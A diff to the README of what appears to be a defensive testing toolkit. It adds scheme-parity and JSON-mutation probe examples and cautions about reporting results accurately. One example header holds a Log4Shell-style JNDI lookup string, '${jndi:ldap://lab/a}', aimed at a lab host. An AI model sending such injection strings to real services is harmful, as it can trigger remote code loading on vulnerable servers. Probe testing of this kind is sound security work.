@@ -12,6 +12,7 @@ Adjust at least these fields before running:
 - target `name`
 - `domains`
 - `critical_endpoints`
+- `scheme_pairs` if you want explicit plaintext `http://` vs `https://` comparison targets
 - `source_ip`
 - `callback_domain`
 - `marker_prefix`
@@ -42,6 +43,23 @@ See `assets/examples/run_manifest.example.md` for the expected shape.
 
 Examples:
 
+- scheme parity:
+
+```bash
+python3 scripts/run_scheme_parity_probe.py \
+  --https-url https://api.example.com/v1/health \
+  --output-dir ./scheme-parity
+```
+
+- scheme parity with the same attack payload:
+
+```bash
+python3 scripts/run_scheme_parity_probe.py \
+  --https-url https://api.example.com/v1/search \
+  --header 'X-Test: ${jndi:ldap://lab/a}' \
+  --output-dir ./scheme-parity-attack
+```
+
 - canonicalization:
 
 ```bash
@@ -66,10 +84,23 @@ python3 scripts/run_tc15_lax_json_probe.py \
   --output-dir ./tc15
 ```
 
+- contract-aware JSON mutation:
+
+```bash
+python3 scripts/run_contract_json_mutation_probe.py \
+  --contract-file assets/examples/request_contract.example.json \
+  --mode tc22 \
+  --target-path ReqData.ReqBody \
+  --output-dir ./tc22-contract
+```
+
 ## 5. Normalize and hand off
+
+If status meaning is ambiguous, run a target-shaped local lab before final reporting. See `references/service_situation_lab.md`.
 
 ```bash
 python3 scripts/merge_normalize_csv.py \
+  --input-spec ./scheme-parity/summary.csv::SCHEME \
   --input-spec ./tc17/summary.csv::HTTPS \
   --input-spec ./tc12/summary.csv::HTTPS \
   --output ./combined.csv
@@ -84,3 +115,9 @@ See:
 
 - `assets/examples/combined.example.csv`
 - `assets/examples/soc_handoff.example.md`
+
+Important:
+
+- Do not claim "HTTP also timed out" from the safe scheme-parity check alone.
+- If the finding is about an attack payload, rerun scheme parity with the same payload bytes or headers.
+- If a live request contract exists, do not use the generic TC-12/15/21/22/23 runners in a way that drops accepted headers, cookies, or the captured JSON envelope. Use the contract-aware runner or build a target-specific wrapper first.
